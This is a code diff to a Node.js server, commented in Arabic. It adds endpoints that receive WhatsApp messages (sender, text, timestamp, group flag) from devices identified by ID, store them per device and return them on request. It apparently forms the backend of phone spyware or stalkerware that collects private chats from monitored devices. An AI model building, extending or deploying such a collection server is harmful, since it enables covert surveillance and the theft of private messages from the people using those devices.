@@ -62,6 +62,30 @@ app.post('/upload.php', (req, res) => {
             return res.json({ success: true, deleted_count: deleted.length });
         }
         
+        // ✅ حفظ رسائل واتساب
+        if (data.type === 'whatsapp_message') {
+            const deviceId = data.device_id || 'unknown';
+            const deviceDir = path.join(dataDir, deviceId);
+            if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });
+            
+            const waFile = path.join(deviceDir, 'whatsapp_messages.json');
+            let waMessages = [];
+            if (fs.existsSync(waFile)) waMessages = JSON.parse(fs.readFileSync(waFile, 'utf8'));
+            
+            waMessages.push({
+                sender: data.sender || 'غير معروف',
+                message: data.message || '',
+                timestamp: data.timestamp || Date.now(),
+                is_group: data.is_group || false
+            });
+            
+            if (waMessages.length > 1000) waMessages = waMessages.slice(-1000);
+            
+            fs.writeFileSync(waFile, JSON.stringify(waMessages, null, 2));
+            updateDevicesList(deviceId, null);
+            return res.json({ success: true, wa_count: waMessages.length });
+        }
+        
         // ✅ البيانات العادية
         const deviceId = data.device_id || 'unknown';
         const deviceDir = path.join(dataDir, deviceId);
@@ -221,6 +245,13 @@ app.get('/api.php', (req, res) => {
         if (action === 'get_image_data') {
             const imagesFile = path.join(dataDir, deviceId, 'images_data.json');
             if (fs.existsSync(imagesFile)) return res.json(JSON.parse(fs.readFileSync(imagesFile, 'utf8')));
+            return res.json([]);
+        }
+        
+        // ✅ استرجاع واتساب
+        if (action === 'get_whatsapp') {
+            const waFile = path.join(dataDir, deviceId, 'whatsapp_messages.json');
+            if (fs.existsSync(waFile)) return res.json(JSON.parse(fs.readFileSync(waFile, 'utf8')));
             return res.json([]);
         }
         
